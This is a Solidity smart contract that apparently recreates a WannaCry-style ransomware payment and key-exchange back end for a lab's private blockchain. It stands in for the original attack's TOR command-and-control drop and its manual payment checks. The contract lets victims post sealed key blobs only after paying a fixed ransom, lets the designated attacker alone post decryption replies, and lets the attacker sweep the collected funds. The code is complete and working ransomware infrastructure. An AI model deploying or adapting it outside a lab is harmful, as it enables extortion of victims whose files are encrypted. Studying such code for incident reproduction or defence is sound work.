// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/**
 * RansomExchange - WannaCry-style ransom exchange on the lab's private chain.
 *
 * Replaces the original incident's BTC + TOR manual operations:
 *   - the TOR C2 message drop  -> registerVictim() calldata + events
 *   - the C2 key reply         -> submitReply() calldata + events
 *   - manual payment checks    -> the enforced msg.value gate in registerVictim
 *
 * The contract only transports opaque sealed bytes. It never sees or handles
 * any plaintext key material; all crypto happens off-chain:
 *   - registerVictim posts the victim's ephemeral X25519 public key and the
 *     victim_priv blob already sealed under the attacker's RSA public key.
 *   - submitReply posts the reply sealed under ECDH(ephemeral, attacker reply
 *     key); only the requesting victim host can open it.
 *
 * Payment enforcement: registerVictim is payable and requires exactly
 * RANSOM_WEI. The EVM itself refuses unpaid registration, which is the
 * on-chain stand-in for the manual "check payment before releasing keys"
 * work the original attackers did by hand.
 */
contract RansomExchange {
    /// Fixed lab ransom: 1 lab ETH per victim. The ChainSeed deployment
    /// utility cannot pass constructor arguments, so the price is a
    /// contract constant; the enforcement itself stays in registerVictim.
    uint256 public constant RANSOM_WEI = 1 ether;

    struct Request {
        address victim;      // msg.sender that registered and paid
        bytes ephemeralPub;  // victim's ephemeral X25519 public key (raw)
        bytes sealedBlob;    // victim_priv sealed under attacker_pub (opaque)
        bool answered;       // attacker reply posted
    }

    /// All recorded requests, in registration order.
    mapping(uint256 => Request) public requests;
    /// Replies per request id: reply sealed to the victim's ephemeral key.
    mapping(uint256 => bytes) public replies;

    uint256 public nextId;
    address public immutable attacker;

    event VictimRegistered(uint256 indexed id, address indexed victim, bytes ephemeralPub);
    event ReplyPosted(uint256 indexed id, bytes sealedReply);

    error AlreadyAnswered();
    error OnlyAttacker();
    error WrongRansomAmount();
    error EmptyPayload();
    error NoReplyYet();

    /**
     * The deployer becomes the attacker. In the lab the utility server's
     * funding account deploys this contract, so that account is designated
     * the attacker address on-chain.
     */
    constructor() {
        attacker = msg.sender;
    }

    /**
     * A victim registers its sealed payload and pays the ransom in one
     * transaction. The payable gate is the enforcement point: without the
     * exact ransom attached the transaction reverts and no request exists.
     */
    function registerVictim(bytes calldata ephemeralPub, bytes calldata sealedBlob)
        external
        payable
        returns (uint256 id)
    {
        if (msg.value != RANSOM_WEI) revert WrongRansomAmount();
        if (ephemeralPub.length == 0 || sealedBlob.length == 0) revert EmptyPayload();

        id = nextId++;
        requests[id] = Request({
            victim: msg.sender,
            ephemeralPub: ephemeralPub,
            sealedBlob: sealedBlob,
            answered: false
        });
        emit VictimRegistered(id, msg.sender, ephemeralPub);
    }

    /**
     * The attacker posts the reply for one paid, unanswered request. The
     * msg.sender gate is the second enforcement point: even a paid request
     * can only be answered by the designated attacker account.
     */
    function submitReply(uint256 id, bytes calldata sealedReply) external {
        if (msg.sender != attacker) revert OnlyAttacker();
        if (requests[id].answered) revert AlreadyAnswered();
        if (requests[id].victim == address(0)) revert EmptyPayload();
        if (sealedReply.length == 0) revert EmptyPayload();

        requests[id].answered = true;
        replies[id] = sealedReply;
        emit ReplyPosted(id, sealedReply);
    }

    /// Victim-side read helper: fetch the reply sealed to your ephemeral key.
    function getReply(uint256 id) external view returns (bytes memory) {
        if (replies[id].length == 0) revert NoReplyYet();
        return replies[id];
    }

    /// The attacker sweeps the collected ransoms off the contract.
    function withdraw() external {
        if (msg.sender != attacker) revert OnlyAttacker();
        uint256 amount = address(this).balance;
        (bool ok, ) = attacker.call{value: amount}("");
        require(ok);
    }
}
